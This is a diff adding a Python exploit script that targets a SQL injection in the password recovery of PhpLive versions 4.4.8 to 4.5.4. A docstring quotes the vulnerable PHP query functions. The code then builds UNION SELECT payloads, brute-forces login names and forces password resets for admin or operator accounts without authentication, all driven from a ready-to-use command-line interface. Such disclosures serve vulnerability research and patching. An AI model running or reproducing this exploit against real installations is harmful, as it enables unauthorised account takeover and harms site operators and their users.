@@ -1,0 +1,117 @@
+#!/bin/env python
+################################################################################################
+# Exploit title: Password Recovery Sql Injection
+# Exploit Author: Tiago Carvalho
+# Vendor Homepage: http://www.phplivesupport.com/?plk=osicodes-5-ykq-m
+# Version : 4.4.8 - 4.5.4
+# Product Name: Phplive
+# Tested on: Debian \ Kali linux 2016-1
+################################################################################################
+"""
+Their are multiple sql injection vunlerabilities in this product.
+The exploit uses the sql injection vulnerability on the last step of the password recovery process
+and force the application to rest the password and show the username, without requiring authentication
+or to ever execute the first step, the vulnerability allows the recovery of both admin and operator.
+
+Vulnerable code location: API/Setup/get.php
+The filtering in place allows alphanumeric and restricts the use of serveral special chars,
+its use of mysql escape functions and stripslashes are bypassed by since theirs no need to inject
+special char to create a valid statement. 
+
+FUNCTION Setup_get_InfoByID( &$dbh,
+					$adminid )
+	{
+		if ( $adminid == "" )
+			return false ;
+
+		LIST( $adminid ) = database_mysql_quote( $dbh, $adminid ) ;
+
+		$query = "SELECT * FROM p_admins WHERE adminID = $adminid LIMIT 1" ;
+		database_mysql_query( $dbh, $query ) ;
+
+		if ( $dbh[ 'ok' ] )
+		{
+			$data = database_mysql_fetchrow( $dbh ) ;
+			return $data ;
+		}
+		return false ;
+	}
+
+Vulnerable code location: /API/Ops/get.php
+
+FUNCTION Ops_get_OpInfoByID( &$dbh,
+					$opid )
+	{
+		if ( $opid == "" )
+			return false ;
+
+		LIST( $opid ) = database_mysql_quote( $dbh, $opid ) ;
+
+		$query = "SELECT * FROM p_operators WHERE opID = $opid LIMIT 1" ;
+		database_mysql_query( $dbh, $query ) ;
+
+		if ( $dbh[ 'ok' ] )
+		{
+			$data = database_mysql_fetchrow( $dbh ) ;
+			return $data ;
+		}
+		return false ;
+	}
+
+
+"""
+
+import re
+import urllib2
+import md5
+import string
+import argparse
+
+match = re.compile(r"<div\sclass=\"edit_title\".*?>(.*)</div>", re.MULTILINE)
+
+
+server_url = "localhost/phplive"
+
+def build_payload(host, sql, search_exp, target, last_active, passwd):
+	req_url = "http://%s/index.php%s"
+	url_params = "?v=%s&%s=0+%s"
+	str = sql % (last_active, passwd, search_exp)
+	pwd_verify = md5.new("%d%d" % (last_active,passwd)).hexdigest() 
+	url_params = url_params % (pwd_verify,target,str)
+	return req_url % (host, url_params)
+
+def exploit(host, admin, last_active, passwd):
+	if admin:
+		target="adminid"
+		sql = "union+all+select+adminid,created,%d,status,ses,login,%d,email+from+p_admins+where+login+like+%s25"
+	else:
+		target="opid"
+		sql = "union+all+select+opid,%d,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,login,%d,0,0,0,0,0,0+from+p_operators+where+login+like+%s25"
+	char_list = list(string.ascii_letters)
+	for char in char_list:
+		payload = build_payload(host, sql, hex(ord(char)), target=target, last_active=last_active, passwd=passwd)
+		request = urllib2.urlopen(payload)
+		if request.code == 200:
+			html = request.read()
+			result = match.findall(html)
+			if len(result) == 2 and result[1]:
+				print "[*]\tSUCCESS!!!!!"
+				print "[*]\t%s %s" %  (re.sub("<span.*?>|</span>","",result[0]), result[1])
+				break				
+		
+# exploit(server_url, admin=False, last_active=1, passwd=1)
+
+if __name__ == '__main__':
+	admin = True
+	parser = argparse.ArgumentParser(description='PhpLive 4.4.8 Password Recovery Sql injection Exploit')
+	parser.add_argument("-u", "--url", help="url host|ipaddress/path eg: localhost/phplive")
+	parser.add_argument("-o", "--operator", help="Execute operators password reset", action="store_true")
+	parser.add_argument("-l", "--lastactive", help="Last active date (int)", type=int, default=0)	
+	parser.add_argument("-p", "--passwd", help="Password (int)", type=int, default=0)	
+	
+	args = parser.parse_args()
+	if args.operator:
+		print "[*]\toperator password reset"
+		admin = False
+	
+	exploit(args.url, admin, args.lastactive, args.passwd)
